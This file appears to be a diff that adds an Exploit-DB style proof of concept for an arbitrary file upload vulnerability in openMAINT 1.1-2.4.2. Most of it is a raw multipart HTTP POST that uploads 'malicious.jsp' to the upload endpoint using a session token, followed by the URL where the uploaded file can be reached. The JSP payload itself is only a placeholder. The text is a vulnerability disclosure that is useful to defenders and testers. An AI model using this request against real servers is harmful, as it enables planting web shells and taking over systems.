@@ -1,0 +1,78 @@
+# Exploit Title: openMAINT 1.1-2.4.2 - Arbitrary File Upload
+# Dork: N/A
+# Date: 2020-08-19
+# Exploit Author: mrb3n
+# Vendor Homepage: https://www.openmaint.org/en
+# Software Link: https://sourceforge.net/projects/openmaint/files/1.1/openmaint-1.1-2.4.2.zip/download
+# Version: 1.1-2.4.2
+# Category: Webapps
+# Tested on: Ubuntu 16.04
+# CVE: N/A
+
+
+# POC: http://localhost:8080/openmaint/administration.jsp
+#
+POST /openmaint/services/json/file/upload?CMDBuild-Authorization=fnlt93ijq0dru5qtenme73d4lf HTTP/1.1
+
+Host: 192.168.1.1:8080
+
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: multipart/form-data; boundary=---------------------------12239060382062588071523757460
+
+Content-Length: 1369
+
+Origin: http://192.168.1.1:8080
+
+DNT: 1
+
+Connection: close
+
+Referer: http://192.168.1.1:8080/openmaint/administration.jsp
+
+Cookie: JSESSIONID=5BAAEBDCC2151BD59ED2CD6FD3CA8165; CMDBuild-Authorization=fnlt93ijq0dru5qtenme73d4lf
+
+Upgrade-Insecure-Requests: 1
+
+
+
+-----------------------------12239060382062588071523757460
+
+Content-Disposition: form-data; name="fileStore"
+
+
+
+images
+
+-----------------------------12239060382062588071523757460
+
+Content-Disposition: form-data; name="folder"
+
+
+
+d41d8cd98f00b204e9800998ecf8427e
+
+-----------------------------12239060382062588071523757460
+
+Content-Disposition: form-data; name="file"; filename="malicious.jsp"
+
+Content-Type: application/octet-stream
+
+
+
+[Malicious code here]
+
+
+-----------------------------12239060382062588071523757460--
+
+
+# The malicious file will be uploaded directly to the /upload/images directory with the file name unchanged, example:
+http://192.168.1.1:8080/openmaint/upload/images/malicious.jsp
+# How to fix: Update to the latest version
+# Earlier versions as well as other 1.1-x  versions are likely vulnerable.
